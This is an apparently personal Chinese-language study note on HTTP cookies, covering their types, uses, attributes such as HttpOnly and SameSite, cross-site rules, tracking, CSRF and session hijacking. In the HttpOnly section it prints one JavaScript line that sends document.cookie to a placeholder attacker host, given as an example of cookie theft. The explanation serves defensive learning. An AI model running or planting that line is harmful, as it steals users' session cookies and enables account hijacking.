---
category:
- Tech
tags:
- Network
status: Done
---



### 一、cookie介绍

HTTP cookie，简称 cookie 是由用户的网页浏览器存放在用户计算机或其他设备上的小文本文件

- cookie可以是由网络服务器创建并由网页浏览器存放
- cookie也可以是前端创建并由网页浏览器存放（Javascript 可读写的 cookie 只能是没有用`http-only`限制的 cookie）

### 二、cookie分类

- 会话cookie

  会话cookie仅在用户浏览网站时临时存储。当用户关闭浏览器后会自动过期或删除

- 持久性cookie

  持久性cookie只在其创建者设置的特定日期后过期，期间一直有效。

- 安全cookie

  安全cookie只能通过加密连接传输（即HTTPS）。它们不能通过未加密的连接传输（即HTTP）。这使得cookie不容易被盗。

- 第一方cookie

  由相同站点发送的 cookie

- 第三方cookie

  由跨站请求发送的cookie
  
  >是否是 相同站点 发送的（不同则为跨站）详见 `cookie跨站`

### 三、cookie用途

- 对话管理

     - 虽然最初引入cookie是为了让用户在浏览网站时记录他们想要购买的物品。但现在用户购物车的内容通常存储在服务器的数据库中，而不再是客户端的cookie中。
     
     - 当前会话cookie的常见用途是登录。当用户访问网站的登录页面时，Web服务器通常会向客户端发送一个包含唯一会话标识符的cookie。当用户成功登录时，服务器会记住该特定会话标识符已经过身份验证，并授予用户访问其服务的权限。
     
     - 一个 Web 站点可能会为每一个访问者产生一个唯一的ID, 然后以 Cookie 文件的形式保存在每个用户的机器上，以后每次请求都带上相应的ID。

- 个性化

  保存用户的偏好，比如网页的字体大小、背景色等等

- 追踪

  跟踪cookie用于跟踪记录用户的网络浏览习惯，比如用户的购买习惯。
  
  可以是当前网站自己跟踪，也可以是第三方跟踪，详见 `cookie安全性`

### 四、cookie属性

#### 4.1 Expires，Max-Age

1. Expires 属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个cookie，浏览器根据本地时间，决定 cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 cookie 一定会在服务器指定的时间过期。

2. Max-Age 属性指定从现在开始 cookie 存在的 秒数，比如60 * 60 * 24 * 365（即一年）。过了这个时间以后，浏览器就不再保留这个 cookie。

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

#### 4.2 Domain

1. Domain 属性指定浏览器发出 HTTP请求时，哪些域名要附带这个 cookie

   如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 cookie 。
   
   如果指定了 domain 属性，那么子域名也会附带这个 cookie 。
   
   如果服务器指定的域名不属于服务器当前域名或者其父域名，浏览器会拒绝这个 cookie 。

#### 4.3 Path

1. Path属性指定浏览器发出HTTP请求时，哪些路径要附带这个cookie。

   只要浏览器发现，Path属性值是HTTP请求路径的开头一部分，就会在头信息里面带上这个 cookie 。

#### 4.4 Secure

1. Secure属性指定浏览器只有在加密协议HTTPS下，才能将这个cookie发送到服务器。

   该属性只是一个开关，不需要指定值

#### 4.5 HttpOnly

1. HttpOnly属性指定该cookie无法通过JavaScript脚本拿到，主要是document.cookie、XMLHttpRequest对象和Request API。这样就防止了该cookie被脚本读到，只有浏览器发出HTTP请求时，才会带上该cookie。

```
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的cookie发往第三方服务器。如果设置了一个cookie的HttpOnly属性，上面代码就不会读到该cookie。

#### 4.6 SameSite

1. SameSite 的作用

   Cookie 的 SameSite 属性就是用来限制第三方 Cookie，从而减少安全风险的。

   比如：CSRF攻击、用户追踪...详见 `cookie安全性`

   >Cookie 的 domain (your-bank.com) 与当前访问的网站 (malicious.com) 不一样，这种 cookie 就称为第三方 cookie。

2. SameSite 的值

   Cookie 的SameSite属性可以设置三个值：Strict、Lax、None

   - **Strict**

     Strict 是最严格的防护，将阻止浏览器在所有跨站点请求中将 cookie 发送到目标站点。因此这种设置可以阻止所有 CSRF 攻击。

     ```
     Set-Cookie: CookieName=CookieValue; SameSite=Strict;
     ```

     这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 cookie，跳转过去总是未登陆状态。
     不过，具有交易业务的网站很可能不希望从外站链接到任何交易页面，因此这种场景最适合使用 strict 标志。

   - **Lax**

     Lax规则稍稍放宽，大多数情况也是不发送第三方 cookie，但是导航到目标网址的Get请求除外。另外，使用JavaScript脚本发起的请求也无法携带第三方 cookie。

     ```
     Set-Cookie: CookieName=CookieValue; SameSite=Lax;
     ```

     导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求、以 GET 方式提交的表单

   - **None**

     Chrome 计划将 Lax 变为默认设置。这时，网站可以选择显式关闭 SameSite 属性，将其设为None。不过，前提是必须同时设置 Secure 属性（Cookie 只能通过 HTTPS 协议发送），否则无效。

     SameSite=None的 cookie 会在同站请求、跨站请求下发送。

### 五、cookie跨站

上面我们讲cookie的分类的时候讲到第一方cookie和第三方cookie 的区别就是：是否是 相同站点 发送的（不同则为跨站）。
所以第三方cookie也可以理解为跨站请求所设置的cookie。

所以，第三方cookie定义中的跨站与samesite所作用的跨站请求中的跨站，两者的判断是一样的。

那么怎么判断是不是形成跨站了呢？

我们是拿 “请求的目标URL（或者cookie的domain）” 和 “当前网站URL（也就是浏览器地址栏中的网址）” 这两者来进行比较从而判断是否形成跨站的。

两者的ORIGIN的注册域相同则为相同站点，不同则构成跨站。所谓注册域，是指您可以购买或租用的域名，即公共后缀（public suffix）之下的一级，也称为顶级域名。

### 六、cookie安全性

#### 6.1 隐私和第三方cookie

由于网页可能第三方服务，所以使用一个网页很可能会遇到第三方cookie（即所访问网页之外其他服务器的cookie）。RFC 2109和RFC 2965要求浏览器保护用户隐私，默认不允许在服务器之间共享cookie。但RFC 6265放宽。大多数浏览器只要第三方网站有合理的隐私政策申明，就默认允许第三方 cookie。

广告是第三方cookie常见的使用场景，广告公司借此跟踪用户。网站应当使用户知道有第三方cookie存在，不向消费者披露第三方cookie使用情况的网站运营商可能面临法律风险。因此，一般网站都会在[隐私或cookie政策](https://zh.m.wikipedia.org/zh-hans/隐私权政策)中对其使用的第三方cookie作出说明。

简单的cookie跟踪举例：

- 用户登录a.com网站，这时候a.com网站是可以通过设置当前网站a.com域名的cookie来记录跟踪用户各种信息习惯的
- 如果a.com用了第三方服务b.com或者有给第三方服务b.com授权，那b.com就可以通过设置b.com域名的cookie来记录当前用户的各种信息习惯的，虽然当前用户没有在b.com网站但依然可以设置b.com的cookie。这就是第三方cookie的使用（纯属个人理解，哈哈）

> 不知道怎么组织被跟踪

#### 6.2 CSRF 攻击

CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。

一个典型的CSRF攻击有着如下的流程：

- 受害者登录a.com，并保留了登录凭证（Cookie）。
- 攻击者引诱受害者访问了b.com。
- b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。
- a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。
- a.com以受害者的名义执行了act=xx。
- 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。

> 攻击者拿不到cookie内容，可以通过设置samesite来阻止CSRF攻击

#### 6.3 Cookie窃取和会话劫持

很多网站使用cookie作为用户的唯一标识符，但如果网站使用cookie作为会话标识符，攻击者就可以通过窃取受害者的全套cookie来冒充用户的请求。

> 攻击者可以拿到cookie内容，可以通过设置httpOnly来防止cookie泄漏

### 参考
[cookie维基百科](https://zh.m.wikipedia.org/zh-hans/Cookie#属性)

[你对cookie了解多少](https://juejin.cn/post/6847902220227182606)